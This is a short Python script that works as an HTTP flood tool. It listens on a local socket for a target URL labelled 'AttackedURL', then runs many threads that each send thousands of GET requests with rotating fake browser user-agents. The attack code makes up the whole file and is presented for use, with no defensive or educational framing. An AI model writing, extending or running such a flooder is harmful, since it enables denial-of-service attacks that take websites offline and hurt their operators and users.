from requests import get
from requests.exceptions import ReadTimeout
from urllib3.exceptions import ReadTimeoutError
from threading import Thread, ThreadError
from os import cpu_count
from random import randrange
from fake_useragent import UserAgent

from socket import socket, AF_INET, SOCK_STREAM

HEADERS_SIZE: int = 40
HEADERS: list[str] = [UserAgent(browsers=['chrome', 'edge', 'internet explorer',
										  'firefox', 'safari', 'opera']).random for _ in range(HEADERS_SIZE)]


class ClientStresser:
	@classmethod
	def request_to_host_with_agent(cls, url: str) -> None:
		header: dict = {'user-agent': HEADERS[randrange(HEADERS_SIZE)]}
		try:
			get(url=url, headers=header)
		except ReadTimeoutError or ReadTimeout:
			pass

	@classmethod
	def request_repetition(cls, url: str, repetition_count: int) -> None:
		for _iter in range(repetition_count):
			cls.request_to_host_with_agent(url)

	@classmethod
	def stresser_host(cls, url: str, repetition_count: int) -> None:
		try:
			try:
				thread_pool: list[Thread] = list()
				for thread_index in range(cpu_count() << 1):
					thread = Thread(target=cls.request_repetition, args=(url, repetition_count,))
					thread.start()
					thread_pool.append(thread)

				for _thread in thread_pool:
					_thread.join()

			except ThreadError as error:
				print(error)
				exit(1)
		except:
			pass


class AttackedURL:
	PORT: int = 2999
	HOST: str = 'localhost'

	@classmethod
	def get(cls) -> bytes:
		with socket(AF_INET, SOCK_STREAM) as _soc:
			_soc.bind((cls.HOST, cls.PORT))
			_soc.listen(1)

			connection, _ = _soc.accept()
			with connection:
				while True:
					data = connection.recv(1024)
					if not data:
						continue
					else:
						return data


def main() -> None:
	address: str = AttackedURL.get().decode('utf-8')
	ClientStresser.stresser_host(url=address, repetition_count=5000)


if __name__ == '__main__':
	main()
